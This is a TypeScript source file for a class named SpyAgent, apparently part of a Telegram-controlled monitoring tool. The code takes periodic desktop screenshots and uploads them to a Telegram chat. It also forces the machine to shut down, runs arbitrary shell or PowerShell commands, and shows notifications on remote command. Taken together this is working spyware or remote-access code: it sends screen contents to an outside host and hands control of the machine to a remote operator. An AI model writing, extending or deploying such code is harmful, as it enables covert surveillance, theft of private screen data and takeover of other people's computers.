import { existsSync, mkdirSync, readFileSync, unlinkSync, writeFileSync } from "fs";
import CryptoJS from "crypto-js";
import notifier from "node-notifier";
import screenshot from "screenshot-desktop";
import os from "os";
import { exec } from "child_process";
import path from "path";
import { Context, Telegraf } from "telegraf";
import { Action, UserData } from "./types";
import User from "../server/models/user.models";
import Image from "../server/models/imgae.model";

export default class SpyAgent {
    _cacheDir: string;
    _cacheFile: string;
    _bot: Telegraf<Context>;
    _files!: Array<string>;
    cacheFilePath: string;
    cacheDirPath: string;
    intervalId: NodeJS.Timeout | undefined;
    interVal: number;
    userName: string | undefined;
    secretFilePath: string;
    credsFilePath: string;
    notifier: notifier.NodeNotifier;
    user: any;
    icon: string;

    constructor(bot: Telegraf<Context>) {
        this._cacheDir = process.env.CACHE_DIR!;
        this._cacheFile = process.env.CACHE_FILE!;
        this.cacheFilePath = path.join(process.cwd(), this._cacheDir, this._cacheFile);
        this.cacheDirPath = path.join(process.cwd(), this._cacheDir);
        this.secretFilePath = path.join(process.cwd(), process.env.CACHE_DIR!, process.env.SECRET_FILE!)
        this.interVal = Number(process.env.INTERVAL!);
        this._bot = bot;
        this.notifier = notifier;
        this.credsFilePath = path.join(process.cwd(), this._cacheDir, process.env.LOCAL_STORAGE!);
        this.icon = path.join(process.cwd(), 'assets', 'hello.png');
        this.born();
        this.processFiles();
    }

    isReady() {
        if (this._bot && this.userName) return console.log('Spy Agent is ready !');
        else return console.log('Spy Agent is not ready!. Wating for a message to detect the user');
    }

    async born() {
        if (!existsSync(this.cacheDirPath)) mkdirSync(this.cacheDirPath);
        if (!existsSync(this.cacheFilePath)) writeFileSync(this.cacheFilePath, '[]', 'utf8');
        if (!existsSync(this.secretFilePath)) writeFileSync(this.secretFilePath, '', 'utf8');
        if (!existsSync(this.credsFilePath)) writeFileSync(this.credsFilePath, '{}', 'utf8');
        this._files = JSON.parse(readFileSync(this.cacheFilePath, 'utf8') || '[]');
        this.intervalId = setInterval(() => this.captureScreeShot(), this.interVal);
        const username = readFileSync(path.join(process.cwd(), process.env.CACHE_DIR!, process.env.SECRET_FILE!));
        this.userName = this.decryptUsername(username.toString());
        const userObj = JSON.parse(readFileSync(this.credsFilePath, 'utf-8'));
        if (userObj?.id) {
            const user = await User.findOne({ _id: userObj.id });
            this.user = user;
        }
    }

    die() {
        writeFileSync(this.cacheFilePath, JSON.stringify(this._files), 'utf-8');
        writeFileSync(this.credsFilePath, JSON.stringify({ id: this.user?._id }) || '{}');
        clearInterval(this.intervalId);
    }

    set setUser(user: string) {
        this.userName = user;
        const encrypted = CryptoJS.AES.encrypt(user, process.env.SECRET_KEY!).toString();
        writeFileSync(path.join(process.cwd(), this._cacheDir, process.env.SECRET_FILE!), encrypted, 'utf8');
    }

    isAnonymous() {
        return this.userName === '' || this.userName === undefined;
    }

    isEmpty() {
        return this._files.length === 0;
    }

    getFirstFile(): string {
        if (!this.isEmpty()) return this._files[0];
        else return '';
    }

    dequeue() {
        if (this.isEmpty()) return console.log('Queue is empty');
        this._files.shift();
    }

    enqueue(fileName: string) {
        this._files.push(fileName);
    }

    decryptUsername(user: string): undefined | string {
        if (!user) return undefined;
        const bytes = CryptoJS.AES.decrypt(user, process.env.SECRET_KEY!);
        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
        return decrypted;
    }

    imageSaver(chunks: Buffer): Promise<string> {
        return new Promise((resolve, reject) => {
            try {
                const timeStamp = new Date().toISOString().replace(/:/g, '-');
                const filePath = path.join(process.cwd(), process.env.FILE_DIR!, `screenshot-${timeStamp}.png`);
                writeFileSync(filePath, chunks);
                resolve(`screenshot-${timeStamp}.png`);
            }
            catch (err) {
                console.log(err);
                reject(err);
            }
        });
    }

    async registerUser(data: UserData, ctx: Context) {
        try {
            if (this.user?.userId === data.userId) return ctx.reply('You are already registered ');
            if (this?.user?._id) return ctx.reply('You are already registered ');
            const user = new User(data);
            await user.save();
            this.user = user;
            ctx.reply('Successfully registered 👍');
        }
        catch (err) {
            console.log(err);
            ctx.reply('Something went wrong while registering user');
        }
    }

    getUser() {
        if (this.user) return this.user;
    }

    identify() {
        const platform: string = os.platform();
        switch (platform) {
            case 'win32':
                exec('shutdown /s /f /t 0', { 'shell': 'powershell.exe' }, (error, stdout, stderr) => {
                    if (error || stderr) {
                        console.log(error || stderr);
                    }
                    else console.log(stdout);
                });
                break;
            case 'linux':
                exec('shutdown now', (error, stdout) => {
                    if (error) return console.log(error);
                    console.log(stdout);
                });
                break;
            case 'darwin':
                exec('sudo shutdown -h now', (error, stdout) => {
                    if (error) return console.log(error);
                    console.log(stdout);
                });
            default:
                console.log('Unknows os detected');
        }
    }

    async execCommand(command: string) {
        try {
            const platform: string = os.platform();
            switch (platform) {
                case 'win32':
                    exec(command, { 'shell': 'powershell.exe' }, (error, stdout, stderr) => {
                        if (error || stderr) {
                            console.log(error || stderr);
                        }
                        else console.log(stdout);
                    });
                    break;
                case 'linux':
                    exec(command, (error, stdout) => {
                        if (error) return console.log(error);
                        console.log(stdout);
                    });
                    break;
                case 'darwin':
                    exec(command, (error, stdout) => {
                        if (error) return console.log(error);
                        console.log(stdout);
                    });
            }
        }
        catch (err) {

        }
    }

    whichUser(name: string) {
        this._bot.telegram.sendMessage(this.userName!, `New Session started,Username :${name}`);
    }

    async captureScreeShot(): Promise<void> {
        try {
            const imageDir = path.join(process.cwd(), process.env.FILE_DIR!);
            if (!existsSync(imageDir)) mkdirSync(imageDir);
            if (this.user?.id) {
                screenshot({ format: 'png' })
                    .then(async (img) => {
                        const fileName = await this.imageSaver(img);
                        const image = new Image({ name: fileName, user: this.user.id });
                        await image.save();
                        this.notifier.notify({
                            title: "Screenshot taken 😉",
                            message: "agent007 is on duty 👮",
                            icon: this.icon,
                        });
                        this.enqueue(fileName);
                    })
                    .catch((err: any) => {
                        console.log(err);
                    });
            }
        }
        catch (err) {
            console.log(err);
        }
    }

    async invinsible(actions: Action) {
        switch (actions.command) {
            case "/peep":
                this.notifier.notify({
                    title: "Helllllo Buddy! ",
                    message: actions.text,
                    icon: this.icon,
                });
                break;
            case "/shutdown":
                this.identify();
                break;
            case "/say":
                this.notifier.notify({
                    title: "Helllllo Buddy! ",
                    message: actions.text,
                    icon: this.icon,
                });
            default:
                console.log('Hu!');

        }
    }

    async processFiles() {
        try {
            this.isReady();
            while (true) {
                if (!this.isEmpty()) {
                    const file = this.getFirstFile();
                    if (file === '') return;
                    const image = path.join(process.cwd(), process.env.FILE_DIR!, file);
                    await this._bot.telegram.sendPhoto(this.userName!, { source: image });
                    // unlinkSync(path.join(process.cwd(), process.env.FILE_DIR!, file));
                    this.dequeue();
                }
                else {
                    await new Promise((r) => setTimeout(r, 5000));
                    continue;
                }
            }
        }
        catch (err) {
            console.log(err);
        }
    }
};